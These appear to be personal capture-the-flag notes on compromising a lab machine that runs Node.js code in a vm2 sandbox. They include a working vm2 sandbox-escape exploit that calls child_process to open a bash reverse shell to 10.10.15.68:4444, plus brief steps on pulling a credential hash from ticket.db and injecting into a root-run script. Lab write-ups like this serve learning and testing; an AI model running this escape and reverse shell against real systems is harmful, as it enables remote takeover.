Port 80 or 3000 will take us to the same website area, where we can
test NODEJS CODE in a SANDBOX ENV

Most likely we are dealing with some kind of Escaping method

---- INFO -----
Restricted Modules
The following Node.js modules have been restricted from importing:
    - child_process
    - fs

This is to prevent users from executing arbitrary system commands, which could be a major security risk.

    - util
    - events
    - assert
    - stream
    - path
    - os
    - zlib

This box is very smart, we can't simply inject any bad lib into the code,
it seems if a bad lib gets executed it is discovered and the program fails

Running gobuster we find a /about that gives us a very nice piece of detail
`The vm2 library` --> exploit this

=== RCE to SVC ===
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.15.68/4444 0>&1"');
}
`

console.log(vm.run(code));

There is a ticket.db in the web directory, inside is joshes cred hash

The bash script we can run as root has bad sanitization, if we inject something
into it, we may be able to break something and leak the root password using
pspy.
